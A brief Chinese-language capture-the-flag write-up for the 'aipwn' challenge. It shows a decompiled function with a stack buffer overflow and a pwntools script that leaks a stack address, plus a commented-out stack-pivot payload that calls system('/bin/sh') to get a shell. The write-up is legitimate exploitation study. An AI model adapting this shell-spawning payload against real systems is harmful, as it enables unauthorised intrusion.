## 这个文件是一些找不到文件的一个wp

## 黄鹤杯：aipwn

这个题目时要给非常简单的栈迁移这里就不多说了

上文件和wp

```c
int vuln()
{
  _BYTE s[44]; // [esp+8h] [ebp-30h] BYREF

  memset(s, 0, 0x28u);
  read(0, s, 0x38u);
  printf("%s", s);
  printf("Maybey AI will help you getshell");
  read(0, s, 0x38u);
  return printf("%s", s);
}
```

exp:

```py
from pwn import *


io = process("/home/fofa/AIPWN")
elf = ELF("/home/fofa/AIPWN")
gdb.attach(io)

io.sendafter("Welcome to the AI world","a"*0x38)

io.recvuntil("a"*0x38)
stack = u32(io.recv(4))
success("stack:"+hex(stack))
# level_ret = 0x8048631
# ret = 0x0804837a
#
# exp = p32(ret)+p32(0x0804837a) + p32(elf.plt["system"]) + p32(elf.plt["system"]) + p32(stack-0x48+4) + b"/bin/sh\x00"
# payload = exp.ljust(0x30,b"A") + p32(stack-0x54)+p32(0x8048631)*2
# gdb.attach(io)
# io.send(payload)

io.interactive()
```

